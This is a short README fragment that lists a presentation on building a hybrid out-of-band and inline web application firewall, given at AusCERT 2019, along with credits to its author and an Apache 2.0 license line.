+- [Building Your Own WAF as a Service and Forgetting about False Positives](presentations/Building%20Your%20Own%20WAF%20as%20a%20Service%20and%20Forgetting%20about%20False%20Positives.pdf) - A presentation about how to build a hybrid mode waf that can work both in an out-of-band manner as well as inline to reduce false positives and latency [Auscert2019](https://conference.auscert.org.au/).
 
 ## Credits & License:
 This work has been presented by [Infected Drake](https://twitter.com/0xInfection) [(0xInfection)](https://github.com/0xinfection) and is licensed under the [Apache 2.0 License](LICENSE). 
